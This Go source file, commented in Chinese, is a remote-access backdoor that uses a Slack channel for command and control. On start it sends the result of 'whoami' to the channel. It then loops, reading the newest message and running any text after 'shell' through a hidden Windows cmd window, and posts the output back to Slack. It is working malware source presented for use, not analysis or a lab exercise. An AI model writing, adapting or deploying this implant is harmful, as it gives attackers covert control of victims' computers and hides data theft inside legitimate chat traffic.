package main

import (
	"bytes"
	"fmt"
	"github.com/axgle/mahonia"
	"github.com/slack-go/slack"
	"log"
	"os/exec"
	"regexp"
	"syscall"
)

const (
	token = "token"
)

//执行命令
func cmd_exec(commad string) string {
	var stderr bytes.Buffer
	var stdout bytes.Buffer
	cmd := exec.Command("cmd", "/c", commad)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	res := stdout.String()
	fmt.Println(res)
	if err != nil {
		log.Printf("error: %v\n", err)
	}
	return res
}

//发送信息到slack
func sendMessage(result string) {
	// 创建slack客户端
	client := slack.New(token)
	// conversations.list 列出在频道中所有的channel
	conversation := new(slack.GetConversationsParameters)
	ch1, _, _ := client.GetConversations(conversation)
	c2Id := ch1[1].ID

	//发送上线消息
	mesSend := slack.MsgOptionText(result, false)
	//PostMessage发送
	_, _, _ = client.PostMessage(c2Id, mesSend)
}

func Run() {
	//设置字符编码
	enc := mahonia.NewDecoder("gbk")
	// 创建slack客户端
	client := slack.New(token)
	// conversations.list 列出在频道中所有的channel
	conversation := new(slack.GetConversationsParameters)
	ch1, _, _ := client.GetConversations(conversation)
	c2Id := ch1[1].ID

	//执行系统命令whoami
	cmd_host := cmd_exec("whoami")
	sendMessage(cmd_host)

	for {
		// 获取会话的历史聊天记录
		conversationHistory := &slack.GetConversationHistoryParameters{ChannelID: c2Id, Limit: 1}

		conversationResp, _ := client.GetConversationHistory(conversationHistory)
		messHis := conversationResp.Messages[0].Msg.Text

		//fmt.Println(messHis)
		if messHis == "shell exit" {
			fmt.Println("程序退出")
			break
		}
		//匹配用户输入cmd命令
		//commad := "shell whoami"
		re := regexp.MustCompile("shell")
		match := re.FindString(messHis)
		if match == "shell" {
			fmt.Println("true")
			res := string([]byte(messHis)[5:])
			cmd_res := cmd_exec(res)
			cmd_res = enc.ConvertString(string(cmd_res))
			sendMessage(cmd_res)

			continue
		}

	}
}

func main() {
	Run()
}
